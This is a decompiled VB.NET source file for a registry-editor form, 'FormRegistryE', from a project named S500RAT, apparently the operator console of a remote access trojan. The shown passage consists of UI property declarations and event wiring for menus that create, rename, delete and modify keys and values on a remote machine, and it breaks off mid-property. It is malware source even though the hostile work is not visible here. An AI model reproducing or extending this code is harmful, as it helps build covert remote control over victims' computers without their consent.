Imports System
Imports System.Collections
Imports System.Collections.Generic
Imports System.ComponentModel
Imports System.Diagnostics
Imports System.Drawing
Imports System.Linq
Imports System.Runtime.CompilerServices
Imports System.Threading
Imports System.Windows.Forms
Imports Gry.Helper
Imports Guna.UI2.WinForms
Imports Guna.UI2.WinForms.Enums
Imports MessagePackLib.MessagePack
Imports Microsoft.VisualBasic
Imports Microsoft.VisualBasic.CompilerServices
Imports Microsoft.Win32
Imports S500RAT.Server.Connection
Imports Sunny.UI

Namespace S500RAT
	' Token: 0x02000028 RID: 40
	<DesignerGenerated()>
	Public Partial Class FormRegistryE
		Inherits Form

		' Token: 0x170002F9 RID: 761
		' (get) Token: 0x06000768 RID: 1896 RVA: 0x00040E43 File Offset: 0x0003F043
		' (set) Token: 0x06000769 RID: 1897 RVA: 0x00040E4D File Offset: 0x0003F04D
		Private Overridable Property hName As ColumnHeader

		' Token: 0x170002FA RID: 762
		' (get) Token: 0x0600076A RID: 1898 RVA: 0x00040E56 File Offset: 0x0003F056
		' (set) Token: 0x0600076B RID: 1899 RVA: 0x00040E60 File Offset: 0x0003F060
		Private Overridable Property hType As ColumnHeader

		' Token: 0x170002FB RID: 763
		' (get) Token: 0x0600076C RID: 1900 RVA: 0x00040E69 File Offset: 0x0003F069
		' (set) Token: 0x0600076D RID: 1901 RVA: 0x00040E73 File Offset: 0x0003F073
		Private Overridable Property hValue As ColumnHeader

		' Token: 0x170002FC RID: 764
		' (get) Token: 0x0600076E RID: 1902 RVA: 0x00040E7C File Offset: 0x0003F07C
		' (set) Token: 0x0600076F RID: 1903 RVA: 0x00040E86 File Offset: 0x0003F086
		Private Overridable Property ColumnHeader1 As ColumnHeader

		' Token: 0x170002FD RID: 765
		' (get) Token: 0x06000770 RID: 1904 RVA: 0x00040E8F File Offset: 0x0003F08F
		' (set) Token: 0x06000771 RID: 1905 RVA: 0x00040E99 File Offset: 0x0003F099
		Private Overridable Property ColumnHeader2 As ColumnHeader

		' Token: 0x170002FE RID: 766
		' (get) Token: 0x06000772 RID: 1906 RVA: 0x00040EA2 File Offset: 0x0003F0A2
		' (set) Token: 0x06000773 RID: 1907 RVA: 0x00040EAC File Offset: 0x0003F0AC
		Private Overridable Property ColumnHeader3 As ColumnHeader

		' Token: 0x170002FF RID: 767
		' (get) Token: 0x06000774 RID: 1908 RVA: 0x00040EB5 File Offset: 0x0003F0B5
		' (set) Token: 0x06000775 RID: 1909 RVA: 0x00040EBF File Offset: 0x0003F0BF
		Private Overridable Property ColumnHeader4 As ColumnHeader

		' Token: 0x17000300 RID: 768
		' (get) Token: 0x06000776 RID: 1910 RVA: 0x00040EC8 File Offset: 0x0003F0C8
		' (set) Token: 0x06000777 RID: 1911 RVA: 0x00040ED2 File Offset: 0x0003F0D2
		Private Overridable Property ColumnHeader5 As ColumnHeader

		' Token: 0x17000301 RID: 769
		' (get) Token: 0x06000778 RID: 1912 RVA: 0x00040EDB File Offset: 0x0003F0DB
		' (set) Token: 0x06000779 RID: 1913 RVA: 0x00040EE5 File Offset: 0x0003F0E5
		Private Overridable Property ColumnHeader6 As ColumnHeader

		' Token: 0x17000302 RID: 770
		' (get) Token: 0x0600077A RID: 1914 RVA: 0x00040EEE File Offset: 0x0003F0EE
		' (set) Token: 0x0600077B RID: 1915 RVA: 0x00040EF8 File Offset: 0x0003F0F8
		Private Overridable Property ColumnHeader7 As ColumnHeader

		' Token: 0x17000303 RID: 771
		' (get) Token: 0x0600077C RID: 1916 RVA: 0x00040F01 File Offset: 0x0003F101
		' (set) Token: 0x0600077D RID: 1917 RVA: 0x00040F0B File Offset: 0x0003F10B
		Private Overridable Property ColumnHeader8 As ColumnHeader

		' Token: 0x17000304 RID: 772
		' (get) Token: 0x0600077E RID: 1918 RVA: 0x00040F14 File Offset: 0x0003F114
		' (set) Token: 0x0600077F RID: 1919 RVA: 0x00040F1E File Offset: 0x0003F11E
		Private Overridable Property ColumnHeader9 As ColumnHeader

		' Token: 0x17000305 RID: 773
		' (get) Token: 0x06000780 RID: 1920 RVA: 0x00040F27 File Offset: 0x0003F127
		' (set) Token: 0x06000781 RID: 1921 RVA: 0x00040F31 File Offset: 0x0003F131
		Private Overridable Property imageRegistryKeyTypeList As ImageList

		' Token: 0x17000306 RID: 774
		' (get) Token: 0x06000782 RID: 1922 RVA: 0x00040F3A File Offset: 0x0003F13A
		' (set) Token: 0x06000783 RID: 1923 RVA: 0x00040F44 File Offset: 0x0003F144
		Private Overridable Property tv_ContextMenuStrip As ContextMenuStrip

		' Token: 0x17000307 RID: 775
		' (get) Token: 0x06000784 RID: 1924 RVA: 0x00040F4D File Offset: 0x0003F14D
		' (set) Token: 0x06000785 RID: 1925 RVA: 0x00040F57 File Offset: 0x0003F157
		Private Overridable Property newToolStripMenuItem As ToolStripMenuItem

		' Token: 0x17000308 RID: 776
		' (get) Token: 0x06000786 RID: 1926 RVA: 0x00040F60 File Offset: 0x0003F160
		' (set) Token: 0x06000787 RID: 1927 RVA: 0x00040F6C File Offset: 0x0003F16C
		Private Overridable Property keyToolStripMenuItem As ToolStripMenuItem
			<CompilerGenerated()>
			Get
				Return Me._keyToolStripMenuItem
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.KeyToolStripMenuItem_Click
				Dim keyToolStripMenuItem As ToolStripMenuItem = Me._keyToolStripMenuItem
				If keyToolStripMenuItem IsNot Nothing Then
					RemoveHandler keyToolStripMenuItem.Click, value2
				End If
				Me._keyToolStripMenuItem = value
				keyToolStripMenuItem = Me._keyToolStripMenuItem
				If keyToolStripMenuItem IsNot Nothing Then
					AddHandler keyToolStripMenuItem.Click, value2
				End If
			End Set
		End Property

		' Token: 0x17000309 RID: 777
		' (get) Token: 0x06000788 RID: 1928 RVA: 0x00040FAF File Offset: 0x0003F1AF
		' (set) Token: 0x06000789 RID: 1929 RVA: 0x00040FB9 File Offset: 0x0003F1B9
		Private Overridable Property toolStripSeparator2 As ToolStripSeparator

		' Token: 0x1700030A RID: 778
		' (get) Token: 0x0600078A RID: 1930 RVA: 0x00040FC2 File Offset: 0x0003F1C2
		' (set) Token: 0x0600078B RID: 1931 RVA: 0x00040FCC File Offset: 0x0003F1CC
		Private Overridable Property stringValueToolStripMenuItem As ToolStripMenuItem
			<CompilerGenerated()>
			Get
				Return Me._stringValueToolStripMenuItem
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.StringValueToolStripMenuItem_Click
				Dim stringValueToolStripMenuItem As ToolStripMenuItem = Me._stringValueToolStripMenuItem
				If stringValueToolStripMenuItem IsNot Nothing Then
					RemoveHandler stringValueToolStripMenuItem.Click, value2
				End If
				Me._stringValueToolStripMenuItem = value
				stringValueToolStripMenuItem = Me._stringValueToolStripMenuItem
				If stringValueToolStripMenuItem IsNot Nothing Then
					AddHandler stringValueToolStripMenuItem.Click, value2
				End If
			End Set
		End Property

		' Token: 0x1700030B RID: 779
		' (get) Token: 0x0600078C RID: 1932 RVA: 0x0004100F File Offset: 0x0003F20F
		' (set) Token: 0x0600078D RID: 1933 RVA: 0x0004101C File Offset: 0x0003F21C
		Private Overridable Property binaryValueToolStripMenuItem As ToolStripMenuItem
			<CompilerGenerated()>
			Get
				Return Me._binaryValueToolStripMenuItem
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.BinaryValueToolStripMenuItem_Click
				Dim binaryValueToolStripMenuItem As ToolStripMenuItem = Me._binaryValueToolStripMenuItem
				If binaryValueToolStripMenuItem IsNot Nothing Then
					RemoveHandler binaryValueToolStripMenuItem.Click, value2
				End If
				Me._binaryValueToolStripMenuItem = value
				binaryValueToolStripMenuItem = Me._binaryValueToolStripMenuItem
				If binaryValueToolStripMenuItem IsNot Nothing Then
					AddHandler binaryValueToolStripMenuItem.Click, value2
				End If
			End Set
		End Property

		' Token: 0x1700030C RID: 780
		' (get) Token: 0x0600078E RID: 1934 RVA: 0x0004105F File Offset: 0x0003F25F
		' (set) Token: 0x0600078F RID: 1935 RVA: 0x0004106C File Offset: 0x0003F26C
		Private Overridable Property dWORD32bitValueToolStripMenuItem As ToolStripMenuItem
			<CompilerGenerated()>
			Get
				Return Me._dWORD32bitValueToolStripMenuItem
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.DWORD32bitValueToolStripMenuItem_Click
				Dim dWORD32bitValueToolStripMenuItem As ToolStripMenuItem = Me._dWORD32bitValueToolStripMenuItem
				If dWORD32bitValueToolStripMenuItem IsNot Nothing Then
					RemoveHandler dWORD32bitValueToolStripMenuItem.Click, value2
				End If
				Me._dWORD32bitValueToolStripMenuItem = value
				dWORD32bitValueToolStripMenuItem = Me._dWORD32bitValueToolStripMenuItem
				If dWORD32bitValueToolStripMenuItem IsNot Nothing Then
					AddHandler dWORD32bitValueToolStripMenuItem.Click, value2
				End If
			End Set
		End Property

		' Token: 0x1700030D RID: 781
		' (get) Token: 0x06000790 RID: 1936 RVA: 0x000410AF File Offset: 0x0003F2AF
		' (set) Token: 0x06000791 RID: 1937 RVA: 0x000410BC File Offset: 0x0003F2BC
		Private Overridable Property qWORD64bitValueToolStripMenuItem As ToolStripMenuItem
			<CompilerGenerated()>
			Get
				Return Me._qWORD64bitValueToolStripMenuItem
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.QWORD64bitValueToolStripMenuItem_Click
				Dim qWORD64bitValueToolStripMenuItem As ToolStripMenuItem = Me._qWORD64bitValueToolStripMenuItem
				If qWORD64bitValueToolStripMenuItem IsNot Nothing Then
					RemoveHandler qWORD64bitValueToolStripMenuItem.Click, value2
				End If
				Me._qWORD64bitValueToolStripMenuItem = value
				qWORD64bitValueToolStripMenuItem = Me._qWORD64bitValueToolStripMenuItem
				If qWORD64bitValueToolStripMenuItem IsNot Nothing Then
					AddHandler qWORD64bitValueToolStripMenuItem.Click, value2
				End If
			End Set
		End Property

		' Token: 0x1700030E RID: 782
		' (get) Token: 0x06000792 RID: 1938 RVA: 0x000410FF File Offset: 0x0003F2FF
		' (set) Token: 0x06000793 RID: 1939 RVA: 0x0004110C File Offset: 0x0003F30C
		Private Overridable Property multiStringValueToolStripMenuItem As ToolStripMenuItem
			<CompilerGenerated()>
			Get
				Return Me._multiStringValueToolStripMenuItem
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.MultiStringValueToolStripMenuItem_Click
				Dim multiStringValueToolStripMenuItem As ToolStripMenuItem = Me._multiStringValueToolStripMenuItem
				If multiStringValueToolStripMenuItem IsNot Nothing Then
					RemoveHandler multiStringValueToolStripMenuItem.Click, value2
				End If
				Me._multiStringValueToolStripMenuItem = value
				multiStringValueToolStripMenuItem = Me._multiStringValueToolStripMenuItem
				If multiStringValueToolStripMenuItem IsNot Nothing Then
					AddHandler multiStringValueToolStripMenuItem.Click, value2
				End If
			End Set
		End Property

		' Token: 0x1700030F RID: 783
		' (get) Token: 0x06000794 RID: 1940 RVA: 0x0004114F File Offset: 0x0003F34F
		' (set) Token: 0x06000795 RID: 1941 RVA: 0x0004115C File Offset: 0x0003F35C
		Private Overridable Property expandableStringValueToolStripMenuItem As ToolStripMenuItem
			<CompilerGenerated()>
			Get
				Return Me._expandableStringValueToolStripMenuItem
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.ExpandableStringValueToolStripMenuItem_Click
				Dim expandableStringValueToolStripMenuItem As ToolStripMenuItem = Me._expandableStringValueToolStripMenuItem
				If expandableStringValueToolStripMenuItem IsNot Nothing Then
					RemoveHandler expandableStringValueToolStripMenuItem.Click, value2
				End If
				Me._expandableStringValueToolStripMenuItem = value
				expandableStringValueToolStripMenuItem = Me._expandableStringValueToolStripMenuItem
				If expandableStringValueToolStripMenuItem IsNot Nothing Then
					AddHandler expandableStringValueToolStripMenuItem.Click, value2
				End If
			End Set
		End Property

		' Token: 0x17000310 RID: 784
		' (get) Token: 0x06000796 RID: 1942 RVA: 0x0004119F File Offset: 0x0003F39F
		' (set) Token: 0x06000797 RID: 1943 RVA: 0x000411A9 File Offset: 0x0003F3A9
		Private Overridable Property toolStripSeparator1 As ToolStripSeparator

		' Token: 0x17000311 RID: 785
		' (get) Token: 0x06000798 RID: 1944 RVA: 0x000411B2 File Offset: 0x0003F3B2
		' (set) Token: 0x06000799 RID: 1945 RVA: 0x000411BC File Offset: 0x0003F3BC
		Private Overridable Property deleteToolStripMenuItem As ToolStripMenuItem
			<CompilerGenerated()>
			Get
				Return Me._deleteToolStripMenuItem
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.DeleteToolStripMenuItem_Click
				Dim deleteToolStripMenuItem As ToolStripMenuItem = Me._deleteToolStripMenuItem
				If deleteToolStripMenuItem IsNot Nothing Then
					RemoveHandler deleteToolStripMenuItem.Click, value2
				End If
				Me._deleteToolStripMenuItem = value
				deleteToolStripMenuItem = Me._deleteToolStripMenuItem
				If deleteToolStripMenuItem IsNot Nothing Then
					AddHandler deleteToolStripMenuItem.Click, value2
				End If
			End Set
		End Property

		' Token: 0x17000312 RID: 786
		' (get) Token: 0x0600079A RID: 1946 RVA: 0x000411FF File Offset: 0x0003F3FF
		' (set) Token: 0x0600079B RID: 1947 RVA: 0x0004120C File Offset: 0x0003F40C
		Private Overridable Property renameToolStripMenuItem As ToolStripMenuItem
			<CompilerGenerated()>
			Get
				Return Me._renameToolStripMenuItem
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.RenameToolStripMenuItem_Click
				Dim renameToolStripMenuItem As ToolStripMenuItem = Me._renameToolStripMenuItem
				If renameToolStripMenuItem IsNot Nothing Then
					RemoveHandler renameToolStripMenuItem.Click, value2
				End If
				Me._renameToolStripMenuItem = value
				renameToolStripMenuItem = Me._renameToolStripMenuItem
				If renameToolStripMenuItem IsNot Nothing Then
					AddHandler renameToolStripMenuItem.Click, value2
				End If
			End Set
		End Property

		' Token: 0x17000313 RID: 787
		' (get) Token: 0x0600079C RID: 1948 RVA: 0x0004124F File Offset: 0x0003F44F
		' (set) Token: 0x0600079D RID: 1949 RVA: 0x0004125C File Offset: 0x0003F45C
		Public Overridable Property timer1 As System.Windows.Forms.Timer
			<CompilerGenerated()>
			Get
				Return Me._timer1
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As System.Windows.Forms.Timer)
				Dim value2 As EventHandler = AddressOf Me.Timer1_Tick
				Dim timer As System.Windows.Forms.Timer = Me._timer1
				If timer IsNot Nothing Then
					RemoveHandler timer.Tick, value2
				End If
				Me._timer1 = value
				timer = Me._timer1
				If timer IsNot Nothing Then
					AddHandler timer.Tick, value2
				End If
			End Set
		End Property

		' Token: 0x17000314 RID: 788
		' (get) Token: 0x0600079E RID: 1950 RVA: 0x0004129F File Offset: 0x0003F49F
		' (set) Token: 0x0600079F RID: 1951 RVA: 0x000412A9 File Offset: 0x0003F4A9
		Private Overridable Property imageRegistryDirectoryList As ImageList

		' Token: 0x17000315 RID: 789
		' (get) Token: 0x060007A0 RID: 1952 RVA: 0x000412B2 File Offset: 0x0003F4B2
		' (set) Token: 0x060007A1 RID: 1953 RVA: 0x000412BC File Offset: 0x0003F4BC
		Friend Overridable Property lstRegistryValues As AeroListView
			<CompilerGenerated()>
			Get
				Return Me._lstRegistryValues
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As AeroListView)
				Dim value2 As LabelEditEventHandler = AddressOf Me.LstRegistryValues_AfterLabelEdit
				Dim value3 As KeyEventHandler = AddressOf Me.LstRegistryValues_KeyUp
				Dim value4 As MouseEventHandler = AddressOf Me.LstRegistryValues_MouseClick
				Dim value5 As MouseEventHandler = AddressOf Me.LstRegistryValues_MouseUp
				Dim lstRegistryValues As AeroListView = Me._lstRegistryValues
				If lstRegistryValues IsNot Nothing Then
					RemoveHandler lstRegistryValues.AfterLabelEdit, value2
					RemoveHandler lstRegistryValues.KeyUp, value3
					RemoveHandler lstRegistryValues.MouseClick, value4
					RemoveHandler lstRegistryValues.MouseUp, value5
				End If
				Me._lstRegistryValues = value
				lstRegistryValues = Me._lstRegistryValues
				If lstRegistryValues IsNot Nothing Then
					AddHandler lstRegistryValues.AfterLabelEdit, value2
					AddHandler lstRegistryValues.KeyUp, value3
					AddHandler lstRegistryValues.MouseClick, value4
					AddHandler lstRegistryValues.MouseUp, value5
				End If
			End Set
		End Property

		' Token: 0x17000316 RID: 790
		' (get) Token: 0x060007A2 RID: 1954 RVA: 0x0004135C File Offset: 0x0003F55C
		' (set) Token: 0x060007A3 RID: 1955 RVA: 0x00041368 File Offset: 0x0003F568
		Friend Overridable Property tvRegistryDirectory As RegistryTreeView
			<CompilerGenerated()>
			Get
				Return Me._tvRegistryDirectory
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As RegistryTreeView)
				Dim value2 As TreeNodeMouseClickEventHandler = AddressOf Me.TvRegistryDirectory_NodeMouseClick
				Dim value3 As NodeLabelEditEventHandler = AddressOf Me.TvRegistryDirectory_AfterLabelEdit
				Dim value4 As TreeViewCancelEventHandler = AddressOf Me.TvRegistryDirectory_BeforeExpand
				Dim value5 As TreeViewCancelEventHandler = AddressOf Me.TvRegistryDirectory_BeforeSelect
				Dim value6 As KeyEventHandler = AddressOf Me.TvRegistryDirectory_KeyUp
				Dim tvRegistryDirectory As RegistryTreeView = Me._tvRegistryDirectory
				If tvRegistryDirectory IsNot Nothing Then
					RemoveHandler tvRegistryDirectory.NodeMouseClick, value2
					RemoveHandler tvRegistryDirectory.AfterLabelEdit, value3
					RemoveHandler tvRegistryDirectory.BeforeExpand, value4
					RemoveHandler tvRegistryDirectory.BeforeSelect, value5
					RemoveHandler tvRegistryDirectory.KeyUp, value6
				End If
				Me._tvRegistryDirectory = value
				tvRegistryDirectory = Me._tvRegistryDirectory
				If tvRegistryDirectory IsNot Nothing Then
					AddHandler tvRegistryDirectory.NodeMouseClick, value2
					AddHandler tvRegistryDirectory.AfterLabelEdit, value3
					AddHandler tvRegistryDirectory.BeforeExpand, value4
					AddHandler tvRegistryDirectory.BeforeSelect, value5
					AddHandler tvRegistryDirectory.KeyUp, value6
				End If
			End Set
		End Property

		' Token: 0x17000317 RID: 791
		' (get) Token: 0x060007A4 RID: 1956 RVA: 0x00041428 File Offset: 0x0003F628
		' (set) Token: 0x060007A5 RID: 1957 RVA: 0x00041432 File Offset: 0x0003F632
		Private Overridable Property lst_ContextMenuStrip As ContextMenuStrip

		' Token: 0x17000318 RID: 792
		' (get) Token: 0x060007A6 RID: 1958 RVA: 0x0004143B File Offset: 0x0003F63B
		' (set) Token: 0x060007A7 RID: 1959 RVA: 0x00041445 File Offset: 0x0003F645
		Private Overridable Property newToolStripMenuItem1 As ToolStripMenuItem

		' Token: 0x17000319 RID: 793
		' (get) Token: 0x060007A8 RID: 1960 RVA: 0x0004144E File Offset: 0x0003F64E
		' (set) Token: 0x060007A9 RID: 1961 RVA: 0x00041458 File Offset: 0x0003F658
		Private Overridable Property keyToolStripMenuItem1 As ToolStripMenuItem
			<CompilerGenerated()>
			Get
				Return Me._keyToolStripMenuItem1
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.KeyToolStripMenuItem1_Click
				Dim keyToolStripMenuItem As ToolStripMenuItem = Me._keyToolStripMenuItem1
				If keyToolStripMenuItem IsNot Nothing Then
					RemoveHandler keyToolStripMenuItem.Click, value2
				End If
				Me._keyToolStripMenuItem1 = value
				keyToolStripMenuItem = Me._keyToolStripMenuItem1
				If keyToolStripMenuItem IsNot Nothing Then
					AddHandler keyToolStripMenuItem.Click, value2
				End If
			End Set
		End Property

		' Token: 0x1700031A RID: 794
		' (get) Token: 0x060007AA RID: 1962 RVA: 0x0004149B File Offset: 0x0003F69B
		' (set) Token: 0x060007AB RID: 1963 RVA: 0x000414A5 File Offset: 0x0003F6A5
		Private Overridable Property toolStripSeparator4 As ToolStripSeparator

		' Token: 0x1700031B RID: 795
		' (get) Token: 0x060007AC RID: 1964 RVA: 0x000414AE File Offset: 0x0003F6AE
		' (set) Token: 0x060007AD RID: 1965 RVA: 0x000414B8 File Offset: 0x0003F6B8
		Private Overridable Property stringValueToolStripMenuItem1 As ToolStripMenuItem
			<CompilerGenerated()>
			Get
				Return Me._stringValueToolStripMenuItem1
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.StringValueToolStripMenuItem1_Click
				Dim stringValueToolStripMenuItem As ToolStripMenuItem = Me._stringValueToolStripMenuItem1
				If stringValueToolStripMenuItem IsNot Nothing Then
					RemoveHandler stringValueToolStripMenuItem.Click, value2
				End If
				Me._stringValueToolStripMenuItem1 = value
				stringValueToolStripMenuItem = Me._stringValueToolStripMenuItem1
				If stringValueToolStripMenuItem IsNot Nothing Then
					AddHandler stringValueToolStripMenuItem.Click, value2
				End If
			End Set
		End Property

		' Token: 0x1700031C RID: 796
		' (get) Token: 0x060007AE RID: 1966 RVA: 0x000414FB File Offset: 0x0003F6FB
		' (set) Token: 0x060007AF RID: 1967 RVA: 0x00041508 File Offset: 0x0003F708
		Private Overridable Property binaryValueToolStripMenuItem1 As ToolStripMenuItem
			<CompilerGenerated()>
			Get
				Return Me._binaryValueToolStripMenuItem1
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.BinaryValueToolStripMenuItem1_Click
				Dim binaryValueToolStripMenuItem As ToolStripMenuItem = Me._binaryValueToolStripMenuItem1
				If binaryValueToolStripMenuItem IsNot Nothing Then
					RemoveHandler binaryValueToolStripMenuItem.Click, value2
				End If
				Me._binaryValueToolStripMenuItem1 = value
				binaryValueToolStripMenuItem = Me._binaryValueToolStripMenuItem1
				If binaryValueToolStripMenuItem IsNot Nothing Then
					AddHandler binaryValueToolStripMenuItem.Click, value2
				End If
			End Set
		End Property

		' Token: 0x1700031D RID: 797
		' (get) Token: 0x060007B0 RID: 1968 RVA: 0x0004154B File Offset: 0x0003F74B
		' (set) Token: 0x060007B1 RID: 1969 RVA: 0x00041558 File Offset: 0x0003F758
		Private Overridable Property dWORD32bitValueToolStripMenuItem1 As ToolStripMenuItem
			<CompilerGenerated()>
			Get
				Return Me._dWORD32bitValueToolStripMenuItem1
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.DWORD32bitValueToolStripMenuItem1_Click
				Dim dWORD32bitValueToolStripMenuItem As ToolStripMenuItem = Me._dWORD32bitValueToolStripMenuItem1
				If dWORD32bitValueToolStripMenuItem IsNot Nothing Then
					RemoveHandler dWORD32bitValueToolStripMenuItem.Click, value2
				End If
				Me._dWORD32bitValueToolStripMenuItem1 = value
				dWORD32bitValueToolStripMenuItem = Me._dWORD32bitValueToolStripMenuItem1
				If dWORD32bitValueToolStripMenuItem IsNot Nothing Then
					AddHandler dWORD32bitValueToolStripMenuItem.Click, value2
				End If
			End Set
		End Property

		' Token: 0x1700031E RID: 798
		' (get) Token: 0x060007B2 RID: 1970 RVA: 0x0004159B File Offset: 0x0003F79B
		' (set) Token: 0x060007B3 RID: 1971 RVA: 0x000415A8 File Offset: 0x0003F7A8
		Private Overridable Property qWORD64bitValueToolStripMenuItem1 As ToolStripMenuItem
			<CompilerGenerated()>
			Get
				Return Me._qWORD64bitValueToolStripMenuItem1
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.QWORD64bitValueToolStripMenuItem1_Click
				Dim qWORD64bitValueToolStripMenuItem As ToolStripMenuItem = Me._qWORD64bitValueToolStripMenuItem1
				If qWORD64bitValueToolStripMenuItem IsNot Nothing Then
					RemoveHandler qWORD64bitValueToolStripMenuItem.Click, value2
				End If
				Me._qWORD64bitValueToolStripMenuItem1 = value
				qWORD64bitValueToolStripMenuItem = Me._qWORD64bitValueToolStripMenuItem1
				If qWORD64bitValueToolStripMenuItem IsNot Nothing Then
					AddHandler qWORD64bitValueToolStripMenuItem.Click, value2
				End If
			End Set
		End Property

		' Token: 0x1700031F RID: 799
		' (get) Token: 0x060007B4 RID: 1972 RVA: 0x000415EB File Offset: 0x0003F7EB
		' (set) Token: 0x060007B5 RID: 1973 RVA: 0x000415F8 File Offset: 0x0003F7F8
		Private Overridable Property multiStringValueToolStripMenuItem1 As ToolStripMenuItem
			<CompilerGenerated()>
			Get
				Return Me._multiStringValueToolStripMenuItem1
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.MultiStringValueToolStripMenuItem1_Click
				Dim multiStringValueToolStripMenuItem As ToolStripMenuItem = Me._multiStringValueToolStripMenuItem1
				If multiStringValueToolStripMenuItem IsNot Nothing Then
					RemoveHandler multiStringValueToolStripMenuItem.Click, value2
				End If
				Me._multiStringValueToolStripMenuItem1 = value
				multiStringValueToolStripMenuItem = Me._multiStringValueToolStripMenuItem1
				If multiStringValueToolStripMenuItem IsNot Nothing Then
					AddHandler multiStringValueToolStripMenuItem.Click, value2
				End If
			End Set
		End Property

		' Token: 0x17000320 RID: 800
		' (get) Token: 0x060007B6 RID: 1974 RVA: 0x0004163B File Offset: 0x0003F83B
		' (set) Token: 0x060007B7 RID: 1975 RVA: 0x00041648 File Offset: 0x0003F848
		Private Overridable Property expandableStringValueToolStripMenuItem1 As ToolStripMenuItem
			<CompilerGenerated()>
			Get
				Return Me._expandableStringValueToolStripMenuItem1
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.ExpandableStringValueToolStripMenuItem1_Click
				Dim expandableStringValueToolStripMenuItem As ToolStripMenuItem = Me._expandableStringValueToolStripMenuItem1
				If expandableStringValueToolStripMenuItem IsNot Nothing Then
					RemoveHandler expandableStringValueToolStripMenuItem.Click, value2
				End If
				Me._expandableStringValueToolStripMenuItem1 = value
				expandableStringValueToolStripMenuItem = Me._expandableStringValueToolStripMenuItem1
				If expandableStringValueToolStripMenuItem IsNot Nothing Then
					AddHandler expandableStringValueToolStripMenuItem.Click, value2
				End If
			End Set
		End Property

		' Token: 0x17000321 RID: 801
		' (get) Token: 0x060007B8 RID: 1976 RVA: 0x0004168B File Offset: 0x0003F88B
		' (set) Token: 0x060007B9 RID: 1977 RVA: 0x00041695 File Offset: 0x0003F895
		Private Overridable Property selectedItem_ContextMenuStrip As ContextMenuStrip

		' Token: 0x17000322 RID: 802
		' (get) Token: 0x060007BA RID: 1978 RVA: 0x0004169E File Offset: 0x0003F89E
		' (set) Token: 0x060007BB RID: 1979 RVA: 0x000416A8 File Offset: 0x0003F8A8
		Private Overridable Property modifyToolStripMenuItem As ToolStripMenuItem
			<CompilerGenerated()>
			Get
				Return Me._modifyToolStripMenuItem
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.ModifyToolStripMenuItem_Click
				Dim modifyToolStripMenuItem As ToolStripMenuItem = Me._modifyToolStripMenuItem
				If modifyToolStripMenuItem IsNot Nothing Then
					RemoveHandler modifyToolStripMenuItem.Click, value2
				End If
				Me._modifyToolStripMenuItem = value
				modifyToolStripMenuItem = Me._modifyToolStripMenuItem
				If modifyToolStripMenuItem IsNot Nothing Then
					AddHandler modifyToolStripMenuItem.Click, value2
				End If
			End Set
		End Property

		' Token: 0x17000323 RID: 803
		' (get) Token: 0x060007BC RID: 1980 RVA: 0x000416EB File Offset: 0x0003F8EB
		' (set) Token: 0x060007BD RID: 1981 RVA: 0x000416F8 File Offset: 0x0003F8F8
		Private Overridable Property modifyBinaryDataToolStripMenuItem As ToolStripMenuItem
			<CompilerGenerated()>
			Get
				Return Me._modifyBinaryDataToolStripMenuItem
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.ModifyBinaryDataToolStripMenuItem_Click
				Dim modifyBinaryDataToolStripMenuItem As ToolStripMenuItem = Me._modifyBinaryDataToolStripMenuItem
				If modifyBinaryDataToolStripMenuItem IsNot Nothing Then
					RemoveHandler modifyBinaryDataToolStripMenuItem.Click, value2
				End If
				Me._modifyBinaryDataToolStripMenuItem = value
				modifyBinaryDataToolStripMenuItem = Me._modifyBinaryDataToolStripMenuItem
				If modifyBinaryDataToolStripMenuItem IsNot Nothing Then
